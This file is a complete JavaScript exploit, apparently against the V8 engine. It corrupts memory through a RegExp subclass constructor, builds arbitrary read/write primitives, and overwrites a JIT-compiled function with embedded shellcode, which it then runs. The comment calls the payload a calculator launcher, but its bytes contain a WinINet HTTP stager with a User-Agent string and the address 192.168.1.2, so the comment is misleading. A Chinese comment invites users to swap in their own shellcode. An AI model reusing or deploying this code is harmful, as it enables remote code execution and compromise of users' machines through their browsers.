ENABLE_LOG = true;
IN_WORKER = true;

// run calc and hang in a loop
var shellcode = [0xfc, 0xe8, 0x89, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xd2, 0x64, 0x8b, 0x52, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf0, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x42, 0x3c, 0x01, 0xd0, 0x8b, 0x40, 0x78, 0x85, 0xc0, 0x74, 0x4a, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x8b, 0x58, 0x20, 0x01, 0xd3, 0xe3, 0x3c, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0x31, 0xc0, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x38, 0xe0, 0x75, 0xf4, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe2, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x58, 0x5f, 0x5a, 0x8b, 0x12, 0xeb, 0x86, 0x5d, 0x68, 0x6e, 0x65, 0x74, 0x00, 0x68, 0x77, 0x69, 0x6e, 0x69, 0x54, 0x68, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x57, 0x57, 0x57, 0x57, 0x68, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xe9, 0x84, 0x00, 0x00, 0x00, 0x5b, 0x31, 0xc9, 0x51, 0x51, 0x6a, 0x03, 0x51, 0x51, 0x68, 0x98, 0x1f, 0x00, 0x00, 0x53, 0x50, 0x68, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x70, 0x5b, 0x31, 0xd2, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52, 0x52, 0x53, 0x52, 0x50, 0x68, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x89, 0xc6, 0x83, 0xc3, 0x50, 0x31, 0xff, 0x57, 0x57, 0x6a, 0xff, 0x53, 0x56, 0x68, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x84, 0xc3, 0x01, 0x00, 0x00, 0x31, 0xff, 0x85, 0xf6, 0x74, 0x04, 0x89, 0xf9, 0xeb, 0x09, 0x68, 0xaa, 0xc5, 0xe2, 0x5d, 0xff, 0xd5, 0x89, 0xc1, 0x68, 0x45, 0x21, 0x5e, 0x31, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x6a, 0x07, 0x51, 0x56, 0x50, 0x68, 0xb7, 0x57, 0xe0, 0x0b, 0xff, 0xd5, 0xbf, 0x00, 0x2f, 0x00, 0x00, 0x39, 0xc7, 0x74, 0xb7, 0x31, 0xff, 0xe9, 0x91, 0x01, 0x00, 0x00, 0xe9, 0xc9, 0x01, 0x00, 0x00, 0xe8, 0x8b, 0xff, 0xff, 0xff, 0x2f, 0x5a, 0x64, 0x57, 0x47, 0x00, 0x8b, 0xcd, 0xa4, 0xef, 0x94, 0xaf, 0x3c, 0x6b, 0x39, 0x46, 0x78, 0xa9, 0x2a, 0xb3, 0x04, 0xcb, 0x88, 0x8e, 0xb9, 0x22, 0x49, 0xb2, 0xfa, 0x5f, 0x91, 0x11, 0x76, 0x5f, 0x17, 0x0d, 0xd7, 0x0b, 0x9e, 0xd9, 0x90, 0x20, 0x0e, 0xf2, 0x11, 0xc5, 0xd6, 0xec, 0x9b, 0x5a, 0xc1, 0x94, 0xa4, 0x4a, 0x24, 0x15, 0xc5, 0x84, 0x8a, 0x37, 0x2d, 0x47, 0x96, 0x40, 0xd0, 0xc3, 0x32, 0xba, 0xcb, 0x00, 0x0c, 0xb3, 0xae, 0x21, 0x90, 0x0d, 0xaf, 0x1c, 0xe7, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x30, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x3b, 0x20, 0x42, 0x4f, 0x31, 0x49, 0x45, 0x38, 0x5f, 0x76, 0x31, 0x3b, 0x45, 0x4e, 0x55, 0x53, 0x29, 0x0d, 0x0a, 0x00, 0x4f, 0x28, 0xe8, 0x09, 0xbc, 0xc0, 0x7c, 0xbd, 0x50, 0xa2, 0xd1, 0x22, 0xfa, 0x88, 0xe2, 0xdf, 0x6f, 0xc1, 0x4b, 0x2d, 0xab, 0x55, 0x5a, 0x58, 0x6b, 0x0e, 0x4c, 0x80, 0xfe, 0x2a, 0x42, 0x5a, 0xa8, 0xc9, 0x7b, 0x41, 0xc3, 0x50, 0xc2, 0xaf, 0x37, 0x9d, 0x24, 0x75, 0x4a, 0x5e, 0x1e, 0xd9, 0x26, 0xa4, 0xcf, 0xbf, 0xee, 0x73, 0x2f, 0xec, 0xb7, 0x2b, 0x66, 0xf2, 0xa6, 0xf9, 0xca, 0x0f, 0x83, 0xea, 0xa3, 0x38, 0xa8, 0x64, 0x68, 0x72, 0x1a, 0x24, 0x04, 0xa5, 0x61, 0x87, 0xf5, 0xab, 0x99, 0xdb, 0xdf, 0xbb, 0xed, 0xc6, 0xa5, 0xf2, 0x7b, 0x4a, 0x59, 0x00, 0xf4, 0x1b, 0x76, 0x67, 0x53, 0x2f, 0x86, 0x75, 0xa2, 0x72, 0x11, 0x8c, 0x5a, 0x62, 0x63, 0x02, 0x02, 0xe9, 0xf6, 0x5e, 0xfa, 0x5e, 0x6d, 0xe7, 0xd7, 0xb0, 0x8e, 0xf3, 0x1f, 0xe9, 0x20, 0x48, 0x6e, 0xa8, 0x3d, 0x61, 0x55, 0x27, 0x0f, 0x4b, 0x1e, 0xf5, 0x4d, 0xaa, 0x38, 0xab, 0x49, 0xe1, 0x97, 0x2e, 0x51, 0xc5, 0x50, 0xfb, 0x67, 0x35, 0x1f, 0xbf, 0xc8, 0xf9, 0xf4, 0xfc, 0xb8, 0x41, 0x29, 0x8c, 0x81, 0x7d, 0x3d, 0x7a, 0xf1, 0x58, 0xd3, 0x39, 0x6b, 0x89, 0x6b, 0xc6, 0xd5, 0x06, 0x3e, 0xf0, 0xc9, 0x5f, 0xb0, 0x6a, 0x0f, 0xc2, 0xe9, 0x2f, 0xd0, 0xec, 0xc1, 0x68, 0x1f, 0x28, 0xa0, 0x2d, 0xe3, 0x8f, 0xc0, 0x74, 0x9d, 0xa1, 0x60, 0x96, 0x92, 0xd2, 0xee, 0xb9, 0xf9, 0x25, 0xa0, 0x00, 0x3b, 0x34, 0xf2, 0x00, 0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x68, 0x00, 0x00, 0x40, 0x00, 0x57, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x01, 0xd9, 0x51, 0x53, 0x89, 0xe7, 0x57, 0x68, 0x00, 0x20, 0x00, 0x00, 0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0xc6, 0x8b, 0x07, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xe5, 0x58, 0xc3, 0xe8, 0xa9, 0xfd, 0xff, 0xff, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x31, 0x2e, 0x32, 0x00, 0x51, 0x09, 0xbf, 0x6d];//shellcode替换成自己的

function print(data) {
}


var not_optimised_out = 0;
var target_function = (function (value) {
    if (value == 0xdecaf0) {
        not_optimised_out += 1;
    }
    not_optimised_out += 1;
    not_optimised_out |= 0xff;
    not_optimised_out *= 12;
});

for (var i = 0; i < 0x10000; ++i) {
    target_function(i);
}


var g_array;
var tDerivedNCount = 17 * 87481 - 8;
var tDerivedNDepth = 19 * 19;

function cb(flag) {
    if (flag == true) {
        return;
    }
    g_array = new Array(0);
    g_array[0] = 0x1dbabe * 2;
    return 'c01db33f';
}

function gc() {
    for (var i = 0; i < 0x10000; ++i) {
        new String();
    }
}

function oobAccess() {
    var this_ = this;
    this.buffer = null;
    this.buffer_view = null;

    this.page_buffer = null;
    this.page_view = null;

    this.prevent_opt = [];

    var kSlotOffset = 0x1f;
    var kBackingStoreOffset = 0xf;

    class LeakArrayBuffer extends ArrayBuffer {
        constructor() {
            super(0x1000);
            this.slot = this;
        }
    }

    this.page_buffer = new LeakArrayBuffer();
    this.page_view = new DataView(this.page_buffer);

    new RegExp({ toString: function () { return 'a' } });
    cb(true);

    class DerivedBase extends RegExp {
        constructor() {
            // var array = null;
            super(
                // at this point, the 4-byte allocation for the JSRegExp `this` object
                // has just happened.
                {
                    toString: cb
                }, 'g'
                // now the runtime JSRegExp constructor is called, corrupting the
                // JSArray.
            );

            // this allocation will now directly follow the FixedArray allocation
            // made for `this.data`, which is where `array.elements` points to.
            this_.buffer = new ArrayBuffer(0x80);
            g_array[8] = this_.page_buffer;
        }
    }

    // try{
    var derived_n = eval(`(function derived_n(i) {
        if (i == 0) {
            return DerivedBase;
        }

        class DerivedN extends derived_n(i-1) {
            constructor() {
                super();
                return;
                ${"this.a=0;".repeat(tDerivedNCount)}
            }
        }

        return DerivedN;
    })`);

    gc();


    new (derived_n(tDerivedNDepth))();

    this.buffer_view = new DataView(this.buffer);
    this.leakPtr = function (obj) {
        this.page_buffer.slot = obj;
        return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt);
    }

    this.setPtr = function (addr) {
        this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt);
    }

    this.read32 = function (addr) {
        this.setPtr(addr);
        return this.page_view.getUint32(0, true, ...this.prevent_opt);
    }

    this.write32 = function (addr, value) {
        this.setPtr(addr);
        this.page_view.setUint32(0, value, true, ...this.prevent_opt);
    }

    this.write8 = function (addr, value) {
        this.setPtr(addr);
        this.page_view.setUint8(0, value, ...this.prevent_opt);
    }

    this.setBytes = function (addr, content) {
        for (var i = 0; i < content.length; i++) {
            this.write8(addr + i, content[i]);
        }
    }
    return this;
}

function trigger() {
    var oob = oobAccess();

    var func_ptr = oob.leakPtr(target_function);
    print('[*] target_function at 0x' + func_ptr.toString(16));

    var kCodeInsOffset = 0x1b;

    var code_addr = oob.read32(func_ptr + kCodeInsOffset);
    print('[*] code_addr at 0x' + code_addr.toString(16));

    oob.setBytes(code_addr, shellcode);

    target_function(0);
}

try{
    print("start running");
    trigger();
}catch(e){
    print(e);
}